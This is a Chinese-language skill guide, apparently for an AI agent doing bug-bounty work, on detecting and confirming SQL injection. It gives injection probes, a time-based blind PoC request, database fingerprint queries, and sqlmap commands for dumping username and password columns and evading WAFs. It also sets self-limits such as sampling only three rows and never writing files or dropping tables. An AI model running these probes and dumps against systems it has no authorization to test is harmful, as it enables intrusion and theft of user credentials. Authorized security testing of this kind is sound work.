# SQL 注入

> 视角：黑盒，从 0 到拿数据/权限。**判断流程优先，payload 靠现场构造，不背。**

## 排他声明

仅当目标是「SQL 语句字符串拼接」时用本 skill。

- NoSQL（Redis / MongoDB 操作符注入）→ 不是 SQLi，另行处理
- SSRF 打内网数据库 → ssrf skill
- LDAP / XML 注入 → 各自 skill
- 堆叠 `xp_cmdshell` 执行命令 → rce skill（本 skill 只证明「可注入」，不负责拿 shell）

---

## 1. 一句话说清

SQLi = 把「数据」提升为「SQL 指令」。

SRC 价值：能拖库或读 admin hash → P1，DBA 权限或 RCE 升级 → P0。
WooYun 27,732 案例：**66% 登录框、64% 搜索、60% POST 表单、26% HTTP Header**。

## 2. 高频入口点（27,732 案例统计）

### 2.1 危险参数名（按频次，优先测）

```
数字 ID：id / sort_id / stid / fid / hotelid
认证：username / password / userpwd
业务：type / action / page / name
.NET 特有：__viewstate / __eventvalidation / __eventargument / __eventtarget
```

### 2.2 注入向量分布

登录框 66% · 搜索 64% · POST 60% · HTTP Header 26% · GET 24% · Cookie 12%

### 2.3 后端类型快表（按后缀猜，再指纹确认）

| 后缀 | 数据库 | 报错关键字 |
|------|--------|----------|
| `.php` | MySQL | `You have an error in your SQL syntax` |
| `.aspx` | MSSQL / Oracle | `Unclosed quotation mark` / `Microsoft OLE DB` |
| `.jsp` `.do` `.action` | Oracle / MySQL | `ORA-00942` |

---

## 3. 判断流程（★ 核心，按顺序执行，任一步 NO 就停）

### Step 1 — 闭合探测（决定是不是注入点）

按 `'` `"` `)` 三个闭合符 + `AND 1=1` / `AND 1=2` 顺序打，观察结果分四类：

| 结果 | 结论 | 下一步 |
|------|------|--------|
| 报错 | 注入点，走报错注入 | Step 2 |
| 布尔差异（1=1 正常 / 1=2 异常） | 注入点，布尔盲 | Step 2 |
| 时间差异（sleep 生效） | 注入点，时间盲 | Step 2 |
| 三者全无 | **非注入点，放弃该参数** | NO 就停，别换更多 payload 硬试 |

### Step 2 — 技术选择（按回显能力降级，别盲试全部）

- 有回显 → UNION
- 有报错 → 报错注入（extractvalue / updatexml / floor）
- 仅真假差异 → 布尔盲
- 仅时间 → 时间盲

### Step 3 — 确认阈值（防误判）

- 时间盲：`sleep(5)` vs `sleep(0)` 至少 **3 次稳定 ≥5 秒差**才算确认，单次延时是网络抖动
- 布尔：`AND 1=1` 与 `AND 1=2` 连续 3 次响应一致才算
- 报错：错误信息含数据库关键字（SQL syntax / ORA-00942 等）

### Step 4 — 数据库指纹（1-2 个请求定类型）

```
MySQL    SELECT version()
MSSQL    SELECT @@version
Oracle   SELECT banner FROM v$version WHERE rownum=1
PG       SELECT version()
SQLite   SELECT sqlite_version()
```

### Step 5 — 停损点（拿到即停，不深入）

- 拿到 `version()` + `database()` 即停（证明可注入即可，不拖库）
- 读 admin hash 只拿前 3 条样本，不全 dump
- WAF 连续 5 种 bypass 无效 → 放弃换入口

---

## 4. 工具（用 run_tool 调 sqlmap）

```bash
sqlmap -u "URL?id=1" --batch
sqlmap -u "..." --dbs
sqlmap -u "..." -D db -T users -C "username,password" --dump --start 1 --stop 3
sqlmap -r request.txt --batch                    # 用 Burp 保存的请求
sqlmap -u "..." --tamper=between,space2comment    # WAF 绕过
```

---

## 5. 复现 / 证据要点

### 5.1 报告必备

1. **基线**：`?id=1` 正常响应
2. **注入证明**：报错 / 布尔差异 / 时间差（≥5s 稳定，5 次复现）
3. **数据证据**：`version()`、`current_database()`、第一行 admin 用户名（脱敏）
4. **影响升级链**：能读 admin hash？能读其他库？能 outfile？

### 5.2 PoC 模板（时间盲示例）

```http
GET /api/search?keyword=test' AND (SELECT SLEEP(5))-- - HTTP/1.1
→ 响应 5.234s   （SLEEP(0) 对照 0.087s，5 次复现一致）
```

### 5.3 CVSS

```
未授权 SQLi（可拖库） 9.1  |  认证 SQLi 8.1  |  SQLi→RCE(DBA) 9.8  |  仅时间盲 5.3
```

### 5.4 影响段模板

> 通过 X 接口的 Y 参数，攻击者可注入 SQL 指令，时间盲稳定 5 秒延时（5/5 复现）。已确认版本 5.7.x、当前库 prod_main、users 表存在 admin。未尝试拖完整数据 / 读 hash / outfile。

---

## 6. 不要做的事

- **禁**：sqlmap 全量 dump 表（`--start 1 --stop 3` 拿 3 条样本足够）
- **禁**：outfile 写文件 / xp_cmdshell 执行命令（「证明能」即可）
- **禁**：堆叠 DROP / DELETE / UPDATE 语句（仅 SELECT）
- **禁**：报告贴完整 PII（脱敏到前 2 + 后 2 字符）
- **禁**：读到的 admin hash 离线破解后实际登录后台
- **限**：sqlmap `--threads=1 --delay=1`
